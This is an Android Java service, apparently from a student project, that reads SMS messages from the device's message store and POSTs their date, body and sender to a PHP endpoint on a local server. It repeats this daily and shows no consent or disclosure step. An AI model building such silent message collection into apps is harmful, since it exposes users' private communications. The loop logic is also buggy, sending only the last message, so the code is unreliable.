package app.mtproject;

import java.util.ArrayList;

import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

import android.app.Service;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.os.RemoteException;
import android.provider.CallLog;
import android.util.Log;
import android.widget.TextView;

public class SmsLoggingService extends Service {
	String date, body, destination;

	private Handler serviceHandler;
	String user_id;
	public String username;
	private Task myTask = new Task();

	@Override
	public IBinder onBind(Intent arg0) {
		Log.d(getClass().getSimpleName(), "onBind()");
		return myRemoteSmsServiceStub;
	}

	private IMyRemoteSmsLoggingService.Stub myRemoteSmsServiceStub = new IMyRemoteSmsLoggingService.Stub() {
		public void dumpSmsLog() throws RemoteException {
			SmsLoggingService.this.dumpSmsLog();
		}
	};

	@Override
	public void onCreate() {
		super.onCreate();
		Log.d(getClass().getSimpleName(), "onCreate()");
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		serviceHandler.removeCallbacks(myTask);
		serviceHandler = null;
		Log.d(getClass().getSimpleName(), "onDestroy()");
	}

	@Override
	public void onStart(Intent intent, int startId) {
		username = intent.getStringExtra("username");
		super.onStart(intent, startId);
		serviceHandler = new Handler();
		serviceHandler.postDelayed(myTask, 10L);
		Log.d(getClass().getSimpleName(), "onStart()");
	}

	class Task implements Runnable {
		public void run() {
			try {
				myRemoteSmsServiceStub.dumpSmsLog();
			} catch (RemoteException e) {
				e.printStackTrace();
			}
			serviceHandler.postDelayed(this, 86400000L);
			Log.i(getClass().getSimpleName(), "Calling the dumpSmsLog");
		}
	}

	private void retrieveUserId() {
		ArrayList<NameValuePair> postParameters = new ArrayList<NameValuePair>();
		postParameters.add(new BasicNameValuePair("username", username));
		String response = null;
		try {
			response = CustomHttpClient.executeHttpPost(
					"http://10.0.2.2/science/getUserId.php", postParameters);
			String res = response.toString();
			res = res.replaceAll("\\s+", "");
			if (!res.equals("0")) {
				Log.d(getClass().getSimpleName(),
						"Successfully retrieved user_id");
				user_id = res;
			} else {
				Log.d(getClass().getSimpleName(), "Error retrieving user_id");
			}
		} catch (Exception e) {
		}
	}

	private void sendData(String user_id) {
		ArrayList<NameValuePair> postParameters = new ArrayList<NameValuePair>();
		postParameters.add(new BasicNameValuePair("user_id", user_id));
		postParameters.add(new BasicNameValuePair("date", date));
		postParameters.add(new BasicNameValuePair("body", body));
		postParameters.add(new BasicNameValuePair("destination", destination));
		String response = null;
		try {
			response = CustomHttpClient.executeHttpPost(
					"http://10.0.2.2/science/sendSmsData.php", postParameters);
			String res = response.toString();
			res = res.replaceAll("\\s+", "");
			if (res.equals("1")) {
				Log.d(getClass().getSimpleName(), "Inserted into DB!");
			} else {
				Log.d(getClass().getSimpleName(), "Error insertando en la DB");
			}
		} catch (Exception e) {
		}
	}

	private void dumpSmsLog() {
		Cursor cursor = getContentResolver().query(Uri.parse("content://sms/"),null, null, null, null);
		if (cursor.moveToFirst()) {
			do {
				try {
					date = CallsLoggingService.create_datestring(cursor.getString(cursor.getColumnIndex("date")));
				} catch (java.text.ParseException e1) {
					e1.printStackTrace();
				}
				
				body = cursor.getString(cursor.getColumnIndex("body"));
				destination = cursor.getString(cursor.getColumnIndex("address"));
			} while (cursor.moveToNext());
		}
		retrieveUserId();
		sendData(user_id);
	}
}